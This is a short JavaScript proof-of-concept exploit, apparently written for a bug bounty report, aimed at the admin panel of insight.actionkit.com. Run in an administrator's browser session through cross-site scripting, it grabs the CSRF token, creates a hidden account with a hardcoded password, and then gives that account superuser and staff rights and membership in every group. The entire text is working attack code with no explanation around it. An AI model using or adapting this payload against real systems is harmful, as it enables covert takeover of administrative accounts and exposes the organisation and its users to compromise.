// Step 1: GET user creation page to get CSRF token
fetch('https://insight.actionkit.com/admin/auth/user/add/', {
  method: 'GET',
  credentials: 'include'
})
  .then(res => res.text())
  .then(data => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(data, 'text/html');
    const csrfToken = doc.querySelector('input[name="csrfmiddlewaretoken"]').value;

    // Step 2: Create a new user
    return fetch('https://insight.actionkit.com/admin/auth/user/add/', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `csrfmiddlewaretoken=${encodeURIComponent(csrfToken)}&email=trey%2Bxss%40inspectiv.com&username=trey_xss&password1=nLCw4SDzV%26IQtn%25e&password2=nLCw4SDzV%26IQtn%25e&_save=Save`
    }).then(() => ({ csrfToken }));
  })
  .then(({ csrfToken }) => {
    // Step 3: GET the user list sorted by most recent
    return fetch('https://insight.actionkit.com/admin/auth/user/?o=-date_joined', {
      method: 'GET',
      credentials: 'include'
    }).then(res => res.text()).then(data => {
      // Extract user ID from the first link that matches /admin/auth/user/<id>/change/
      const match = data.match(/\/admin\/auth\/user\/(\d+)\/change\//);
      if (!match) throw new Error("User ID not found in user list.");
      const userId = match[1];
      return { csrfToken, userId };
    });
  })
  .then(({ csrfToken, userId }) => {
    // Step 4: Privilege escalation
    const escalateUrl = `https://insight.actionkit.com/admin/auth/user/${userId}/change/`;
    const body = `csrfmiddlewaretoken=${encodeURIComponent(csrfToken)}&username=trey_xss&first_name=&last_name=&email=trey%2Bxss%40inspectiv.com&is_active=on&is_staff=on&is_superuser=on&groups=5&groups=10&groups=11&groups=1&groups=14&groups=2&groups=15&groups=20&groups=4&groups=16&groups=17&groups=18&groups=19&groups=3&groups=6&groups=21&groups=24&groups=22&groups=23&groups=7&groups=8&groups=9&groups=13&groups=12&groups=25&groups=26&_save=Save`;

    return fetch(escalateUrl, {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body
    });
  })
  .then(res => res.text())
  .then(data => {
    console.log("Privilege escalation complete. Response:", data);
  })
  .catch(err => {
    console.error("Error:", err);
  });
